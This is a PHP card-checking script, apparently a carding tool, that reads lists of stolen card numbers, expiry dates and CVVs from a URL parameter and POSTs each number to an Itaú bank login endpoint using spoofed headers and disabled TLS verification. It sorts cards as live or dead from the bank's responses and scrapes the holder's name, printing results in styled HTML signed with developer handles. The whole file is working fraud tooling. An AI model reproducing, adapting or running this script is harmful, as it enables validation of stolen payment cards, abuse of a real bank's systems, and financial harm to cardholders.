<?php

error_reporting(0);
sleep(3);

$ip = getUserIP();

function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

if (file_exists("baiano.txt")) {
unlink("baiano.txt");}

//$str = ''.$cc.'';
//$lines = file('live.html');
//foreach($lines as $line)
//if (strpos($line, $str) !== false) {
    //$file = fopen("live.html", "a");
//fwrite($file, "$cc|$mes|$ano|$cvv BIN:</br>"); 
//die("</span> <span class='badge badge-outline-danger'> Reprovada </span><font> <font style='color: white'><b><font style=color: white><font style=color:white>   $cc|$mes|$ano|$cvv ➜  $bin </font> <span class='<font style='color: red'> ➜ <span class='badge badge-outline-warning'>   <font color='Black'> </span>  </span> <br>");
//exit();
//}

$time = time();

function multiexplode($delimiters, $string) {
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}


$lista = $_GET['lista'];
$cc = multiexplode(array("|", " "), $lista)[0];
$mes = multiexplode(array("|", " "), $lista)[1];
$ano = multiexplode(array("|", " "), $lista)[2];
$cvv = multiexplode(array("|", " "), $lista)[3];



function bin ($cc){
$contents = file_get_contents("bins.csv");
$pattern = preg_quote(substr($cc, 0, 6), '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
$encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
}
$bin = bin($lista);

function getStr($string, $start, $end) {
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://internetnc5.itau.com.br/router-app/router');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: internetnc5.itau.com.br',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:89.0) Gecko/20100101 Firefox/89.0',
'Content-Type: application/x-www-form-urlencoded',
'Referer: https://www.itau.com.br/',
'Origin: https://www.itau.com.br'

)); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'usuario.cartao='.$cc.'&portal=999&pre-login=pre-login&usuario.cpf=&tipoLogon=9');
 $xereca = curl_exec($ch);


$nome = getStr($xereca, '<h1>', '</h1>');




if (strpos($xereca, 'consulta e resgate de pontos')) {
echo "</span> <span class='badge badge-success'> Aprovada </span><font> <font style='color: white'><b><font style=color: white><font style=color:white>   $cc|$mes|$ano|$cvv </font> ➜ <font style=color:#4000ff> $nome ➜<font style='color: white'> $bin </font> <span class='<font style='color: red'> <span class='badge badge-success'> MEC  </span>  ➜ [(" . (time() - $time) .  "seg)] <font> <font color='Black'> </span>  # @random_dev </span><br>";
}

else if (strpos($xereca, 'verifique')) {
echo "</span> <span class='badge badge-danger'> Reprovada </span><font> <font style='color: white'><b><font style=color: white><font style=color:white>   $cc|$mes|$ano|$cvv  ➜ $bin </font> <span class='<font style='color: red'> <span class='badge badge-primary'> Cartão Invalido <font> ➜ [(" . (time() - $time) .  "seg)] <font color='Black'> </span> # @random_dev </span><br>";
}

else if (strpos($xereca, 'bloqueado')) {
echo "</span> <span class='badge badge-danger'> Reprovada </span><font> <font style='color: white'><b><font style=color: white><font style=color:white>   $cc|$mes|$ano|$cvv ➜ $bin </font> <span class='<font style='color: red'> <span class='badge badge-warning'> Cartão bloqueado <font> ➜ [(" . (time() - $time) .  "seg)] <font color='Black'> </span>  # @random_dev </span><br>";
}

else if (strpos($xereca, 'site errado.')) {
echo "</span> <span class='badge badge-danger'> ReprovadaA </span><font> <font style='color: white'><b><font style=color: white><font style=color:white>   $cc|$mes|$ano|$cvv ➜ $bin </font> <span class='<font style='color: red'> <span class='badge badge-ligth'> Cartão De Outro Banco <font> ➜ [(" . (time() - $time) .  "seg)] <font color='Black'> </span>  # @random_dev </span><br>";
}

else if (strpos($xereca, 'validar')) {
echo "</span> <span class='badge badge-danger'> Reprovada </span><font> <font style='color: white'><b><font style=color: white><font style=color:white>   $cc|$mes|$ano|$cvv ➜ $bin </font> <span class='<font style='color: red'> <span class='badge badge-info'> Não Conseguimos Validar seu acesso <font> ➜ [(" . (time() - $time) .  "seg)] <font color='Black'> </span>  # @random_dev </span><br>";
}

else{
echo "</span> <span class='badge badge-danger'> Reprovada </span><font> <font style='color: white'><b><font style=color: white><font style=color:white>   $cc|$mes|$ano|$cvv ➜ $bin </font> <span class='<font style='color: red'> <span class='badge badge-secondary'> Desconhecido <font> ➜ [(" . (time() - $time) .  "seg)] <font color='Black'> </span>  # @minist666 </span><br>";
}

?>